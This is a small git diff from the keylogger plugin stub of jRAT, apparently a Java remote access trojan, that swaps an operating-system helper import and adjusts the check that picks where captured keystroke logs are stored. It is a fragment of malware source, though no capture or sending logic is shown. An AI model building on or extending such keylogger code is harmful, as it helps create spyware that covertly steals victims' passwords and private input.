@@ -3,14 +3,14 @@ package se.jrat.plugin.keylogger.stub;
 import java.io.File;
 import java.util.Date;
 
-import jrat.api.stub.utils.OperatingSystem;
-
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
 import se.jrat.plugin.keylogger.stub.activities.Activities;
 import se.jrat.plugin.keylogger.stub.activities.Key;
 import se.jrat.plugin.keylogger.stub.codec.Base64;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 
 @SuppressWarnings("deprecation")
@@ -40,7 +40,7 @@ public class Keylogger implements NativeKeyListener {
 	public static File getLogsRoot() {
 		File file;
 		
-		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 			file = new File(System.getenv("APPDATA") + "\\logs\\");
 		} else {
 			file = new File(System.getProperty("user.home") + "/Library/logs/");
